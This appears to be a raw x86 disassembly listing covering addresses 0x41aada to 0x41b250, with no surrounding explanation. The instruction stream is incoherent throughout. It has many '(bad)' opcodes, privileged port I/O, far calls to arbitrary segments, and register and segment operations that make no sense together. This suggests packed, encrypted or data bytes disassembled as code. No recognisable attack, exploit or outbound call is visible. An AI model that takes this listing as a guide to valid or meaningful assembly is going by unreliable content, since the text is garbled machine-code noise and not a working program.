  41aada:	ret    0x191f
  41aadd:	pop    eax
  41aade:	psllq  mm6,QWORD PTR [ebx+0x5b880ef2]
  41aae5:	mov    ch,0xf8
  41aae7:	xchg   edx,eax
  41aae8:	xchg   edi,eax
  41aae9:	xchg   edx,eax
  41aaea:	xor    al,0x3
  41aaec:	je     0x41aa9c
  41aaee:	bound  ebp,QWORD PTR [eax-0x1dc7370f]
  41aaf4:	add    dh,BYTE PTR [eax]
  41aaf6:	std    
  41aaf7:	pop    es
  41aaf8:	dec    esp
  41aaf9:	mov    al,0x36
  41aafb:	pop    esp
  41aafc:	rcl    dh,cl
  41aafe:	loopne 0x41ab56
  41ab00:	pop    edx
  41ab01:	mov    eax,ds:0xabd26e6a
  41ab06:	adc    ebx,DWORD PTR [edi-0x47721dad]
  41ab0c:	aas    
  41ab0d:	mov    ecx,0xb6bdbd2b
  41ab12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab13:	add    DWORD PTR [ebp+0x4d0bcc2c],ebx
  41ab19:	imul   ebp,DWORD PTR [edi-0x14731cbe],0x19c2a26d
  41ab23:	lahf   
  41ab24:	andnps xmm4,XMMWORD PTR [esi]
  41ab27:	rcr    BYTE PTR [ecx+0x2b],1
  41ab2a:	iret   
  41ab2b:	sub    al,0xf6
  41ab2d:	pop    ecx
  41ab2e:	gs dec ebp
  41ab30:	sbb    eax,0x794ca8be
  41ab35:	push   ebp
  41ab36:	enter  0xed02,0x92
  41ab3a:	test   BYTE PTR [bp+si-0x10db],0xfb
  41ab40:	jg     0x41ab90
  41ab42:	adc    dl,BYTE PTR [eax+0x5ebb9b3d]
  41ab48:	push   0x9eebbe1b
  41ab4d:	fs mov esi,?
  41ab50:	aam    0x16
  41ab52:	fnstsw WORD PTR [ecx+0x28]
  41ab55:	push   es
  41ab56:	adc    BYTE PTR [edx+ebx*8-0x3524a71e],cl
  41ab5d:	push   DWORD PTR [esi-0x11]
  41ab60:	jnp    0x41ab28
  41ab62:	mov    bl,0x35
  41ab64:	jnp    0x41abb6
  41ab66:	xor    al,0x95
  41ab68:	xchg   ebx,eax
  41ab69:	cdq    
  41ab6a:	fistp  WORD PTR [ebx-0x7f]
  41ab6d:	not    DWORD PTR [edx+0x2a9f77ab]
  41ab73:	push   es
  41ab74:	in     al,0xab
  41ab76:	push   edi
  41ab77:	(bad)  
  41ab79:	sbb    edi,DWORD PTR [ecx]
  41ab7b:	aad    0xac
  41ab7d:	push   esi
  41ab7e:	mov    ch,0xe5
  41ab80:	push   es
  41ab81:	(bad)  
  41ab82:	and    esp,DWORD PTR [eax]
  41ab84:	(bad)  
  41ab85:	push   esi
  41ab86:	ret    
  41ab87:	inc    edi
  41ab88:	cmp    dh,BYTE PTR ds:0x273576a6
  41ab8e:	retf   
  41ab8f:	mov    esp,0xe16c6ca6
  41ab94:	jae    0x41ab64
  41ab96:	(bad)  
  41ab97:	xchg   edi,eax
  41ab98:	lods   eax,DWORD PTR ds:[esi]
  41ab99:	ss out dx,eax
  41ab9b:	std    
  41ab9c:	xlat   BYTE PTR ds:[ebx]
  41ab9d:	mov    al,0xed
  41ab9f:	call   0x1549:0xdf4ae81b
  41aba6:	mov    cl,0xea
  41aba8:	mov    al,ds:0xd3720945
  41abad:	dec    esi
  41abae:	or     al,0x5f
  41abb0:	sbb    eax,0x892673fa
  41abb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abb6:	push   ecx
  41abb7:	loopne 0x41aba5
  41abb9:	(bad)  
  41abba:	frstor [ebp-0x5d]
  41abbd:	aam    0x14
  41abbf:	sub    al,0xeb
  41abc1:	ret    0xb20e
  41abc4:	stos   DWORD PTR es:[edi],eax
  41abc5:	mov    ebx,0x14f68259
  41abca:	inc    eax
  41abcb:	pusha  
  41abcc:	mov    edx,0xb4785457
  41abd1:	xor    ah,ah
  41abd3:	lock mov ds,ecx
  41abd6:	stc    
  41abd7:	(bad)  
  41abd9:	nop
  41abda:	es repz fs daa 
  41abde:	repnz repnz sti 
  41abe1:	xchg   BYTE PTR [ecx],al
  41abe3:	frstor [edi+0x389853a9]
  41abe9:	enter  0x3c97,0x89
  41abed:	xor    esp,DWORD PTR [ecx+0x2c]
  41abf0:	fstp   QWORD PTR [esi+0x19b8f537]
  41abf6:	ds inc ebx
  41abf8:	mov    ds:0x3b27bdde,eax
  41abfd:	add    eax,0x5bc6497
  41ac02:	pop    edx
  41ac03:	int3   
  41ac04:	inc    ebp
  41ac05:	cmp    esi,DWORD PTR [ebx]
  41ac07:	xor    eax,0x32a4512c
  41ac0c:	(bad)  
  41ac0d:	js     0x41abcf
  41ac0f:	mov    bl,0xfc
  41ac11:	dec    ebp
  41ac12:	jge    0x41ac1b
  41ac14:	xor    edx,DWORD PTR [edi-0x4c49be3b]
  41ac1a:	ds pushf 
  41ac1c:	pop    eax
  41ac1d:	pop    ebp
  41ac1e:	pop    ss
  41ac1f:	inc    edx
  41ac20:	loope  0x41ac8f
  41ac22:	aaa    
  41ac23:	fnstenv ds:0xf42a040e
  41ac29:	xchg   DWORD PTR [edi+0x3c],edi
  41ac2c:	jge    0x41abb7
  41ac2e:	mov    esp,0x69ac0fb5
  41ac33:	mov    eax,ds:0x9b834594
  41ac38:	ja     0x41ac13
  41ac3a:	cwde   
  41ac3b:	lea    eax,[ebx-0x13d3df9c]
  41ac41:	retf   0x57bb
  41ac44:	jg     0x41acae
  41ac46:	(bad)  
  41ac48:	arpl   cx,bx
  41ac4a:	ins    BYTE PTR es:[edi],dx
  41ac4b:	cs pop ebp
  41ac4d:	test   al,0x94
  41ac4f:	arpl   WORD PTR [ebx],bx
  41ac51:	gs mov edi,0xa6b0df2c
  41ac57:	in     eax,0x46
  41ac59:	or     al,0xa3
  41ac5b:	out    dx,eax
  41ac5c:	loope  0x41ac7e
  41ac5e:	mov    ds:0x4268e03a,eax
  41ac63:	cwde   
  41ac64:	mov    cs:0xa15419b4,al
  41ac6a:	or     ecx,DWORD PTR ds:0xfd60bd42
  41ac70:	cdq    
  41ac71:	aad    0x9f
  41ac73:	add    eax,0x655f1513
  41ac78:	iret   
  41ac79:	out    dx,eax
  41ac7a:	adc    eax,0xf7753033
  41ac7f:	dec    edx
  41ac80:	pop    ecx
  41ac81:	sub    DWORD PTR [esi+0x27bb5879],edi
  41ac87:	push   ss
  41ac88:	retf   
  41ac89:	(bad)  
  41ac8a:	fstp   DWORD PTR [eax+0x5c]
  41ac8d:	adc    esp,DWORD PTR ds:0x69718de0
  41ac93:	ja     0x41ac2a
  41ac95:	pop    ebx
  41ac96:	cld    
  41ac97:	lods   eax,DWORD PTR ds:[esi]
  41ac98:	pop    edx
  41ac99:	test   DWORD PTR [esi+ebp*2],edx
  41ac9c:	fimul  WORD PTR [esi+0x74]
  41ac9f:	test   al,0xb9
  41aca1:	imul   esi,DWORD PTR [ecx],0xffffffcb
  41aca4:	lds    ebx,FWORD PTR [edi]
  41aca6:	sar    ch,cl
  41aca8:	xchg   ebp,eax
  41aca9:	scas   al,BYTE PTR es:[edi]
  41acaa:	bswap  edi
  41acac:	lods   al,BYTE PTR ds:[esi]
  41acad:	inc    esp
  41acae:	mov    bh,0x59
  41acb0:	lahf   
  41acb1:	lods   al,BYTE PTR ds:[esi]
  41acb2:	sub    edx,0x6458d1c0
  41acb8:	or     al,0x1
  41acba:	retf   0x180d
  41acbd:	test   BYTE PTR [esi+0x2affcf8e],bh
  41acc3:	mov    DWORD PTR [eax],esi
  41acc5:	inc    esp
  41acc6:	sub    al,0x7f
  41acc8:	test   BYTE PTR [esi+0x2d],dh
  41accb:	cld    
  41accc:	in     eax,dx
  41accd:	xchg   ebx,eax
  41acce:	jnp    0x41ad03
  41acd0:	sbb    BYTE PTR [ebp-0x80],0x2e
  41acd4:	popf   
  41acd5:	test   al,0xd4
  41acd7:	jo     0x41acf9
  41acd9:	mov    ds:0x25333f86,eax
  41acde:	out    0x4a,al
  41ace0:	mov    DWORD PTR [eax-0x55],ebp
  41ace3:	and    al,0xc8
  41ace5:	push   esi
  41ace6:	pop    eax
  41ace7:	and    eax,0xb8d41f95
  41acec:	js     0x41acf2
  41acee:	cli    
  41acef:	and    al,0xa4
  41acf1:	or     DWORD PTR [edi+0x2b7d7dd6],edx
  41acf7:	(bad)  
  41acf8:	mov    DWORD PTR [esi-0x1c],ecx
  41acfb:	or     al,0xe6
  41acfd:	sbb    BYTE PTR [ebx+eiz*1],dl
  41ad00:	adc    esi,DWORD PTR gs:[ebp-0x4f0aceaf]
  41ad07:	shl    edx,0x3d
  41ad0a:	sub    cl,BYTE PTR [ecx+ecx*4]
  41ad0d:	daa    
  41ad0e:	mov    edi,0x33901e7c
  41ad13:	mov    DWORD PTR [ebp-0xb],0x545ac97f
  41ad1a:	mov    ds:0x75e4750a,eax
  41ad1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad20:	pop    ebx
  41ad21:	dec    edi
  41ad22:	jl     0x41acc8
  41ad24:	bound  edx,QWORD PTR [edi-0x18]
  41ad27:	or     dh,BYTE PTR [edi-0x63c7dc5b]
  41ad2d:	mov    DWORD PTR [esi],eax
  41ad2f:	cmp    bl,ch
  41ad31:	or     edx,DWORD PTR [eax-0xc753ff5]
  41ad37:	cmp    DWORD PTR [eax+0x260722ce],edx
  41ad3d:	rcr    DWORD PTR [ecx],0x8e
  41ad40:	mov    cl,0xcd
  41ad42:	cmp    eax,0xa37bd723
  41ad47:	aas    
  41ad48:	ret    0x412c
  41ad4b:	jbe    0x41adb2
  41ad4d:	test   al,0x8e
  41ad4f:	xor    al,0xa4
  41ad51:	push   eax
  41ad52:	inc    eax
  41ad53:	test   al,0x1e
  41ad55:	push   cs
  41ad56:	dec    ebx
  41ad57:	cdq    
  41ad58:	push   es
  41ad59:	or     bl,BYTE PTR [ecx]
  41ad5b:	xor    ebx,DWORD PTR ss:[ebp-0x65]
  41ad5f:	mov    ebx,0x7c6ce804
  41ad64:	mov    cs,WORD PTR ds:0x4f240d3f
  41ad6a:	push   0xbe676912
  41ad6f:	fmul   st(0),st
  41ad71:	mov    ds:0x6fae9f2d,al
  41ad76:	add    DWORD PTR [edx],edi
  41ad78:	inc    esp
  41ad79:	gs jns 0x41ad3d
  41ad7c:	sbb    edi,DWORD PTR [edi]
  41ad7e:	loope  0x41adbd
  41ad80:	add    edx,DWORD PTR [eax]
  41ad82:	out    0xde,eax
  41ad84:	or     eax,0x84e7c249
  41ad89:	outs   dx,BYTE PTR ds:[esi]
  41ad8a:	pop    es
  41ad8b:	xchg   edx,eax
  41ad8c:	arpl   WORD PTR [edx-0x519889ae],ax
  41ad92:	lds    ecx,FWORD PTR [ebp+0x83d86fa]
  41ad98:	adc    al,0x40
  41ad9a:	jno    0x41adda
  41ad9c:	mov    edi,0xb9b72e7d
  41ada1:	mov    dl,bl
  41ada3:	hlt    
  41ada4:	mov    al,0x71
  41ada6:	inc    esi
  41ada7:	(bad)  
  41ada8:	iret   
  41ada9:	dec    eax
  41adaa:	ja     0x41ae11
  41adac:	push   0x77be5920
  41adb1:	rcr    ebp,1
  41adb3:	adc    ecx,DWORD PTR [eax+0x6ad7b060]
  41adb9:	scas   al,BYTE PTR es:[edi]
  41adba:	xchg   edi,eax
  41adbb:	leave  
  41adbc:	jmp    FWORD PTR [ecx+0x5e]
  41adbf:	push   ecx
  41adc0:	outs   dx,BYTE PTR ds:[esi]
  41adc1:	ret    0xacf7
  41adc4:	xchg   ebx,eax
  41adc5:	shl    BYTE PTR ds:[ecx+0x2c],1
  41adc9:	rcr    cl,cl
  41adcb:	or     DWORD PTR [edx-0x3d210328],esp
  41add1:	(bad)  
  41add2:	call   0x39e1:0x85afa802
  41add9:	jp     0x41adea
  41addb:	mov    bl,0x3c
  41addd:	call   0x5bc09f57
  41ade2:	retf   0xdb0
  41ade5:	mov    eax,ds:0xd5aeed7
  41adea:	pop    ebx
  41adeb:	outs   dx,DWORD PTR ds:[esi]
  41adec:	or     al,0x0
  41adee:	sbb    al,0x99
  41adf0:	pop    ss
  41adf1:	xor    al,0x5b
  41adf3:	push   esp
  41adf4:	jl     0x41ae48
  41adf6:	jge    0x41ae46
  41adf8:	test   BYTE PTR [ecx+edx*4-0x72],dh
  41adfc:	(bad)  
  41adfd:	fwait
  41adfe:	jmp    0x41ae02
  41ae00:	rcr    dh,0xf1
  41ae03:	mov    edi,DWORD PTR [eax+0x5b]
  41ae06:	add    bl,ch
  41ae08:	sub    bl,bh
  41ae0a:	jg     0x41adab
  41ae0c:	pop    ebx
  41ae0d:	rcl    BYTE PTR [ecx-0x69fa70dc],1
  41ae13:	cmp    DWORD PTR [ecx],edx
  41ae15:	aas    
  41ae16:	pop    esi
  41ae17:	cmp    BYTE PTR [edi+0x36],ch
  41ae1a:	xchg   esp,eax
  41ae1b:	sbb    BYTE PTR [ecx],0x9
  41ae1e:	jbe    0x41ae75
  41ae20:	xchg   ebp,eax
  41ae21:	shr    DWORD PTR [esi+0x2d],1
  41ae24:	ret    
  41ae25:	jnp    0x41adce
  41ae27:	int3   
  41ae28:	xor    al,0x2b
  41ae2a:	imul   ecx,edx,0x5993d836
  41ae30:	sti    
  41ae31:	mov    cl,0x74
  41ae33:	or     al,0x1e
  41ae35:	in     al,dx
  41ae36:	jle    0x41ae6d
  41ae38:	cwde   
  41ae39:	jno    0x41ae5c
  41ae3b:	and    DWORD PTR [ebx-0x65],esi
  41ae3e:	enter  0x393a,0x68
  41ae42:	les    esi,FWORD PTR [edx+0x4d821849]
  41ae48:	scas   al,BYTE PTR es:[edi]
  41ae49:	inc    edx
  41ae4a:	fisub  DWORD PTR [edx-0x4e]
  41ae4d:	pop    eax
  41ae4e:	ins    DWORD PTR es:[edi],dx
  41ae4f:	cmp    BYTE PTR [ebp-0x7b],ch
  41ae52:	dec    ebp
  41ae53:	(bad)  
  41ae54:	adc    DWORD PTR [edi-0x7034504c],ebp
  41ae5a:	mov    al,ds:0x6c1da78b
  41ae5f:	sub    DWORD PTR [ebx+0x74],0xa
  41ae63:	or     al,0xc5
  41ae65:	jb     0x41ae08
  41ae67:	dec    ecx
  41ae68:	adc    BYTE PTR [esi],cl
  41ae6a:	adc    esp,edx
  41ae6c:	lods   eax,DWORD PTR ds:[esi]
  41ae6d:	test   DWORD PTR [ecx-0x30],eax
  41ae70:	adc    DWORD PTR [edx-0x6db99d4e],0xfffffff1
  41ae77:	fiadd  WORD PTR [edi+0x7f930c16]
  41ae7d:	jmp    0x18e615e1
  41ae82:	inc    ecx
  41ae83:	adc    DWORD PTR [eax+0x77],esp
  41ae86:	add    BYTE PTR [esi-0x1c56fe03],bl
  41ae8c:	stos   BYTE PTR es:[edi],al
  41ae8d:	mov    ebp,0x5925185e
  41ae92:	xchg   esi,eax
  41ae93:	jne    0x41ae79
  41ae95:	xchg   edi,eax
  41ae96:	dec    esp
  41ae97:	mov    bl,BYTE PTR [ecx-0x2c700d52]
  41ae9d:	jnp    0x41ae89
  41ae9f:	jne    0x41ae32
  41aea1:	out    dx,al
  41aea2:	test   DWORD PTR [esi+0x2a599b09],0x1b75ac24
  41aeac:	pause  
  41aeae:	mov    al,ds:0xf21c23c7
  41aeb3:	pop    ebx
  41aeb4:	sub    BYTE PTR [ecx+0x14],bl
  41aeb7:	inc    edx
  41aeb8:	aaa    
  41aeb9:	inc    ecx
  41aeba:	loope  0x41af36
  41aebc:	in     eax,dx
  41aebd:	aaa    
  41aebe:	cmp    al,0x3
  41aec0:	push   edx
  41aec1:	xchg   edx,eax
  41aec2:	repnz imul ebp,DWORD PTR [edi-0x21],0xffffffa5
  41aec7:	ins    BYTE PTR es:[edi],dx
  41aec8:	jmp    0x41ae95
  41aeca:	jmp    0x76f4:0xa6aa5db2
  41aed1:	lods   al,BYTE PTR ds:[esi]
  41aed2:	xor    BYTE PTR [ecx+0x52],bl
  41aed5:	or     DWORD PTR [eax],edi
  41aed7:	aad    0x9b
  41aed9:	fcmovb st,st(2)
  41aedb:	mov    ?,eax
  41aedd:	js     0x41ae77
  41aedf:	lahf   
  41aee0:	xor    edx,DWORD PTR [edx]
  41aee2:	or     eax,0xa3a1383e
  41aee7:	jg     0x41af09
  41aee9:	scas   al,BYTE PTR es:[edi]
  41aeea:	mov    ds:0xf7edb015,eax
  41aeef:	in     eax,dx
  41aef0:	xchg   BYTE PTR [edx-0x41a283f6],al
  41aef6:	xchg   ebp,eax
  41aef7:	call   0x810a2b81
  41aefc:	in     al,dx
  41aefd:	pop    es
  41aefe:	mov    ebx,0xca05edca
  41af03:	out    0x6f,eax
  41af05:	(bad)  
  41af06:	daa    
  41af07:	mov    esp,0x5832c2ad
  41af0c:	test   eax,0xb205ad2f
  41af11:	xchg   BYTE PTR [eax],cl
  41af13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af14:	cmc    
  41af15:	and    esp,esp
  41af17:	jbe    0x41af16
  41af19:	xchg   esi,eax
  41af1a:	mul    DWORD PTR [eax+0x238f5d32]
  41af20:	mov    dl,0xa0
  41af22:	xchg   edi,eax
  41af23:	xchg   BYTE PTR [ebx+0x6f],dl
  41af26:	aam    0x58
  41af28:	outs   dx,DWORD PTR ds:[esi]
  41af29:	mov    bh,0x66
  41af2b:	jl     0x41af8f
  41af2d:	icebp  
  41af2e:	or     al,0xf2
  41af30:	jmp    0x8d37ff95
  41af35:	test   BYTE PTR [ebx],bl
  41af37:	mov    bh,0xd7
  41af39:	fisub  WORD PTR ds:[ebp+0x1d7942ca]
  41af40:	lahf   
  41af41:	dec    esp
  41af42:	outs   dx,DWORD PTR ds:[esi]
  41af43:	gs inc esp
  41af45:	inc    esi
  41af46:	push   ds
  41af47:	inc    ebp
  41af48:	push   ebp
  41af49:	xor    eax,0x6e174a29
  41af4e:	jbe    0x41afb1
  41af50:	mov    BYTE PTR [edx-0x4e],bl
  41af53:	pop    eax
  41af54:	repnz cmp dl,bh
  41af57:	dec    ebp
  41af58:	add    bh,BYTE PTR [esi]
  41af5a:	shl    DWORD PTR [ecx+0x5deae7f4],0x4a
  41af61:	leave  
  41af62:	sbb    DWORD PTR [bx+di+0x4a3e],ebp
  41af67:	or     eax,0x7ff890f
  41af6c:	pop    eax
  41af6d:	cmp    bl,BYTE PTR [edi]
  41af6f:	xlat   BYTE PTR ds:[ebx]
  41af70:	sub    esp,ebx
  41af72:	outs   dx,BYTE PTR ds:[esi]
  41af73:	push   es
  41af74:	cli    
  41af75:	dec    esp
  41af76:	iret   
  41af77:	xor    ebp,esp
  41af79:	xor    ebp,DWORD PTR ds:0x9e37fe93
  41af7f:	xchg   esp,eax
  41af80:	in     al,dx
  41af81:	inc    ebx
  41af82:	dec    ecx
  41af83:	mov    ss,WORD PTR [ebp+0x3c]
  41af86:	ja     0x41afd1
  41af88:	div    DWORD PTR [ebx]
  41af8a:	cld    
  41af8b:	lods   al,BYTE PTR gs:[esi]
  41af8d:	or     eax,0x98e07404
  41af92:	adc    ebp,ecx
  41af94:	mov    ds:0xa11f3610,eax
  41af99:	push   ss
  41af9a:	or     BYTE PTR [ecx-0x31],0xbb
  41af9e:	xchg   ecx,eax
  41af9f:	add    eax,0xe94f1774
  41afa4:	jo     0x41afa1
  41afa6:	aad    0x55
  41afa8:	jmp    0x41b021
  41afaa:	scas   al,BYTE PTR es:[edi]
  41afab:	sub    DWORD PTR [eax+0x2a],esp
  41afae:	mov    esp,0x5e62309f
  41afb3:	sub    dh,al
  41afb5:	or     eax,0x99058448
  41afba:	int    0xd0
  41afbc:	hlt    
  41afbd:	mov    al,ds:0x9cfd681a
  41afc2:	inc    eax
  41afc3:	sti    
  41afc4:	nop
  41afc5:	add    eax,0x82aec770
  41afca:	sub    ebx,ecx
  41afcc:	ins    BYTE PTR es:[edi],dx
  41afcd:	int3   
  41afce:	lds    ecx,FWORD PTR [eax+ecx*8]
  41afd1:	add    BYTE PTR [eax],dh
  41afd3:	imul   edi,DWORD PTR [esi+ebp*1+0x6b],0x6501939a
  41afdb:	add    eax,0x5706626d
  41afe0:	jb     0x41afdf
  41afe2:	jmp    0x41af7d
  41afe4:	sub    dl,BYTE PTR [edi-0x3]
  41afe7:	sub    edi,DWORD PTR [ebx+eiz*4-0x653c5881]
  41afee:	xchg   edx,eax
  41afef:	loop   0x41af87
  41aff1:	mov    ecx,DWORD PTR ds:[eax+0x47]
  41aff5:	icebp  
  41aff6:	mov    ds:0x6f0fc32f,eax
  41affb:	sbb    ebp,edx
  41affd:	(bad)  
  41affe:	jnp    0x41afac
  41b000:	scas   al,BYTE PTR es:[edi]
  41b001:	jno    0xef8fcc9
  41b007:	scas   eax,DWORD PTR es:[edi]
  41b008:	jbe    0x41afd8
  41b00a:	pop    ebx
  41b00b:	pusha  
  41b00c:	pop    edi
  41b00d:	test   dh,0x5c
  41b010:	cdq    
  41b011:	lds    esi,FWORD PTR [edi+0x2d]
  41b014:	mov    eax,ds:0x7a892238
  41b019:	gs xchg ebp,eax
  41b01b:	imul   esp,DWORD PTR [ecx],0xb0b24a19
  41b021:	adc    ebp,DWORD PTR [ebx+0x78461569]
  41b027:	xor    eax,0x43265268
  41b02c:	add    edi,eax
  41b02e:	in     eax,0x44
  41b030:	xchg   edi,eax
  41b031:	daa    
  41b032:	call   0xbf54:0x86df8cd
  41b039:	js     0x41b0a9
  41b03b:	xor    al,0x81
  41b03d:	loop   0x41b090
  41b03f:	adc    eax,DWORD PTR [esi+eiz*8+0xf5c6bed]
  41b046:	call   0x269386a1
  41b04b:	jle    0x41b074
  41b04d:	adc    edx,DWORD PTR [ebx]
  41b04f:	vpaddusb ymm6,ymm1,YMMWORD PTR [edi+ecx*2+0x7c]
  41b055:	and    eax,0x28fcb1f
  41b05a:	arpl   WORD PTR [esp+esi*1-0x4e390f6e],bx
  41b061:	pop    eax
  41b062:	call   0xd51ea66f
  41b067:	xor    DWORD PTR [ebp-0x34],edi
  41b06a:	mov    edi,0xecc33a3d
  41b06f:	and    al,BYTE PTR [esi+eax*1+0x53534fb]
  41b076:	jge    0x41affd
  41b078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b079:	mov    eax,ss
  41b07b:	xchg   esi,eax
  41b07c:	cdq    
  41b07d:	jae    0x41b01c
  41b07f:	or     al,0x7e
  41b081:	or     al,al
  41b083:	sbb    eax,esi
  41b085:	xchg   ecx,eax
  41b086:	mov    eax,0xc16a3537
  41b08b:	push   eax
  41b08c:	neg    DWORD PTR [esi+0x34bcae2d]
  41b092:	inc    ecx
  41b093:	jecxz  0x41b032
  41b095:	push   esi
  41b096:	jb     0x41b0b9
  41b098:	add    dh,BYTE PTR [ecx+0x9]
  41b09b:	iret   
  41b09c:	lahf   
  41b09d:	sar    DWORD PTR [edx-0x19c394da],0x54
  41b0a4:	add    DWORD PTR [ecx-0x1cfc9e71],ebp
  41b0aa:	popa   
  41b0ab:	xchg   ecx,eax
  41b0ac:	sar    BYTE PTR [esi+0x74cf2900],cl
  41b0b2:	sbb    ebx,ebp
  41b0b4:	loope  0x41b0eb
  41b0b6:	in     al,0xc5
  41b0b8:	aad    0x33
  41b0ba:	xor    BYTE PTR [eax],bh
  41b0bc:	fld    TBYTE PTR [esi]
  41b0be:	mov    ebx,0x38f4e75c
  41b0c3:	xchg   esi,eax
  41b0c4:	dec    edx
  41b0c5:	repnz fwait
  41b0c7:	sahf   
  41b0c8:	push   esi
  41b0c9:	push   0x4f
  41b0cb:	xor    ebp,ebp
  41b0cd:	lahf   
  41b0ce:	js     0x41b098
  41b0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0d1:	jbe    0x41b149
  41b0d3:	shl    DWORD PTR [esp+edi*8-0x784504f9],0x8e
  41b0db:	(bad)  
  41b0dc:	pop    edi
  41b0dd:	xlat   BYTE PTR ds:[ebx]
  41b0de:	mov    es,WORD PTR [edi-0x3a2f5071]
  41b0e4:	icebp  
  41b0e5:	mov    bl,bl
  41b0e7:	add    bl,cl
  41b0e9:	and    ah,cl
  41b0eb:	cmp    al,0xa7
  41b0ed:	jl     0x41b0f8
  41b0ef:	mov    ecx,ss
  41b0f1:	lds    ebp,FWORD PTR [edi+esi*2]
  41b0f4:	push   eax
  41b0f6:	add    ebx,DWORD PTR [ebp+0x6f]
  41b0f9:	out    dx,al
  41b0fa:	or     DWORD PTR [ecx-0x3aa76ea1],ecx
  41b100:	shl    DWORD PTR [eax-0x4b3c62d3],cl
  41b106:	pop    ecx
  41b107:	push   esp
  41b108:	pop    edi
  41b109:	sub    DWORD PTR [ecx],ebp
  41b10b:	sub    bl,al
  41b10d:	fisub  DWORD PTR [ebp+0x61bdea8e]
  41b113:	jo     0x41b0c1
  41b115:	sbb    BYTE PTR [ebp+0x1d],0xf2
  41b119:	xchg   ecx,eax
  41b11a:	xor    ah,bl
  41b11c:	pop    ebp
  41b11d:	mov    dh,0x27
  41b11f:	add    eax,0x8618bac5
  41b124:	or     cl,cl
  41b126:	gs daa 
  41b128:	daa    
  41b129:	(bad)  
  41b12a:	ins    DWORD PTR es:[edi],dx
  41b12b:	pop    ss
  41b12c:	scas   al,BYTE PTR es:[edi]
  41b12d:	loop   0x41b14b
  41b12f:	xchg   ecx,eax
  41b130:	push   edx
  41b131:	and    dh,bh
  41b133:	sahf   
  41b134:	cdq    
  41b135:	jg     0x41b18c
  41b137:	sub    DWORD PTR [edi],ebx
  41b139:	imul   esp,DWORD PTR [ecx],0xa1b08949
  41b13f:	pop    esp
  41b140:	int3   
  41b141:	stos   BYTE PTR es:[edi],al
  41b142:	mov    ecx,0xe9d51f20
  41b147:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41b149:	aaa    
  41b14a:	cli    
  41b14b:	out    dx,al
  41b14c:	std    
  41b14d:	call   0x28f5dc5a
  41b152:	mov    BYTE PTR [esi-0x12],cl
  41b155:	jns    0x41b1ce
  41b157:	int3   
  41b158:	ds ss jo 0x41b184
  41b15c:	jmp    0xd51f3096
  41b161:	pop    es
  41b162:	lods   al,BYTE PTR ds:[esi]
  41b163:	enter  0xbde6,0xd5
  41b167:	aam    0xb9
  41b169:	inc    eax
  41b16a:	shr    bl,cl
  41b16c:	or     eax,eax
  41b16e:	xor    al,0xc3
  41b170:	icebp  
  41b171:	pop    ecx
  41b172:	pop    ebp
  41b173:	js     0x41b1cb
  41b175:	mov    DWORD PTR [ecx+ebp*2],ecx
  41b178:	xor    eax,ecx
  41b17a:	xchg   esi,eax
  41b17b:	and    bl,BYTE PTR [edi-0x23]
  41b17e:	jnp    0x41b166
  41b180:	and    al,0x54
  41b182:	or     al,0x9f
  41b184:	daa    
  41b185:	je     0x41b110
  41b187:	sbb    DWORD PTR [edx+0x41022076],ecx
  41b18d:	mov    ebp,0x25203a98
  41b192:	(bad)  
  41b193:	scas   eax,DWORD PTR es:[edi]
  41b194:	push   esi
  41b195:	sbb    ebx,DWORD PTR [eax-0x7ebb1a22]
  41b19b:	ficom  WORD PTR [eax]
  41b19d:	sbb    eax,0x193f1b49
  41b1a2:	sub    DWORD PTR [esi+0x3],eax
  41b1a5:	mov    WORD PTR [eax+0x508dfea3],cs
  41b1ab:	fs push ds
  41b1ad:	pop    ebp
  41b1ae:	ret    0x5286
  41b1b1:	xchg   DWORD PTR [ecx],ebp
  41b1b3:	xlat   BYTE PTR ds:[ebx]
  41b1b4:	pop    eax
  41b1b5:	outs   dx,BYTE PTR ds:[esi]
  41b1b6:	pop    ecx
  41b1b7:	fldcw  WORD PTR [ebx-0x28de5953]
  41b1bd:	das    
  41b1be:	fnstsw WORD PTR [ebx-0x3b28f9fd]
  41b1c4:	push   edi
  41b1c6:	add    edi,DWORD PTR [ebx+ebx*8]
  41b1c9:	lea    ecx,fs:[edx+0x3df389bc]
  41b1d0:	mov    al,ds:0xb8752881
  41b1d5:	xchg   DWORD PTR [ebx+0x1c],ecx
  41b1d8:	loop   0x41b1ba
  41b1da:	jnp    0x41b1a0
  41b1dc:	and    al,0xde
  41b1de:	push   edi
  41b1df:	xor    DWORD PTR [edx-0x3c823c57],eax
  41b1e5:	jns    0x41b1cc
  41b1e7:	scas   al,BYTE PTR es:[edi]
  41b1e8:	jns    0x41b1ee
  41b1ea:	std    
  41b1eb:	push   ebp
  41b1ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1ed:	adc    bh,ah
  41b1ef:	xlat   BYTE PTR ds:[ebx]
  41b1f0:	adc    DWORD PTR [eax+0x70],ecx
  41b1f3:	xchg   ebx,eax
  41b1f4:	jnp    0x41b1c3
  41b1f6:	jmp    0x41b262
  41b1f8:	push   esp
  41b1f9:	call   DWORD PTR [edi+edx*1]
  41b1fc:	xchg   edx,eax
  41b1fd:	xchg   BYTE PTR [ebp-0x58],al
  41b200:	cmp    dh,bl
  41b202:	sub    al,0xa9
  41b204:	pop    ss
  41b205:	jae    0x41b211
  41b207:	mov    esp,0x9393fe93
  41b20c:	stos   BYTE PTR es:[edi],al
  41b20d:	call   0x483a:0xf89feae4
  41b214:	loop   0x41b1da
  41b216:	call   0x52bb:0xacd47664
  41b21d:	out    dx,al
  41b21e:	xchg   esp,eax
  41b21f:	jl     0x41b1ca
  41b221:	and    edx,DWORD PTR [ebx-0x9]
  41b224:	retf   0x8568
  41b227:	lahf   
  41b228:	imul   eax,ebp,0xffffff81
  41b22b:	das    
  41b22c:	jbe    0x41b264
  41b22e:	cwde   
  41b22f:	or     ebp,edi
  41b231:	sbb    eax,0x98b69a10
  41b236:	imul   eax,DWORD PTR [ecx],0xaa5abcc7
  41b23c:	mov    esi,0x893afed
  41b241:	imul   esi,DWORD PTR [ebx-0x727a5357],0x91661737
  41b24b:	lahf   
  41b24c:	mov    dh,dh
  41b24e:	push   cs
  41b24f:	leave  
  41b250:	dec    ebp
